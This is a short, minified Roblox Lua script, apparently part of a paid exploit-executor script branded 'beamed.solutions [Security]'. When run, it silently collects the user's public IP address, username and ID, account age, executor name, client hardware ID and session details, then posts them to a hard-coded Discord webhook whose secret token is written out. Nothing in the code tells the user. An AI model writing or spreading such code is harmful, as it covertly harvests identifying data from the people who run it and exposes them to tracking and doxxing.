...
local a=game:HttpGet("https://api.ipify.org")local b=identifyexecutor()local c=game:GetService("Players").LocalPlayer;local d=c.AccountAge;local e=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name;local f="1082732263042732173"local g=game:GetService("RbxAnalyticsService"):GetClientId()local h=game.Stats.Network.ServerStatsItem["Data Ping"]:GetValueString()local i=game:GetService("Stats").Workspace.Heartbeat:GetValueString()local j="https://api.creavite.co/out/chsEtewNFDCurrh4ij_static.png"syn.request({Url="https://discord.com/api/webhooks/1084935903425867896/cPfFlQm_7o5g8otsjaqh7dJ4GHN3terTGCZ5_H7KR76J7Bte85CNMQ-V_5Sg2nGDG0nD",Body=game:GetService("HttpService"):JSONEncode({["embeds"]={{["color"]="8660705",["fields"]={{["name"]="**Paid user Executed**",["value"]="",["inline"]=false},{["name"]="This user has executed the script via [Paid] mode successfully!",["value"]="",["inline"]=false},{["name"]="**IPv4:                            (🌐)**",["value"]="||```"..a.."```||",["inline"]=true},{["name"]="**Player:                            (🖥️)**",["value"]="```"..game.Players.LocalPlayer.Name.." ("..game.Players.LocalPlayer.UserId..")```",["inline"]=true},{["name"]="**Network:                        (🌐)**",["value"]="```Ping: "..h.." Fps: "..i.."```",["inline"]=true},{["name"]="**Account Age:                 (🔞)**",["value"]="```"..d.."```",["inline"]=true},{["name"]="**Executor:**",["value"]="```"..b.."```",["inline"]=true},{["name"]="**Game Name:**",["value"]="```"..e.."```",["inline"]=true},{["name"]="**HWID:**",["value"]="||`"..g..">`||",["inline"]=true},{["name"]="**Job ID:** ||`"..game.JobId.."`||",["value"]="",["inline"]=true},{["name"]="**Discord ID:                     (🪪)**",["value"]="**<@"..f..">**",["inline"]=true}},["footer"]={["text"]="beamed.solutions - #1 [Security] v1.01",["icon_url"]=j}}},["avatar_url"]="https://static.vecteezy.com/system/resources/previews/015/117/375/non_2x/padlock-icon-with-glowing-neon-effect-security-lock-sign-secure-protection-symbol-free-png.png",["username"]="[Security]"}),Method="POST",Headers={["content-type"]="application/json"}})
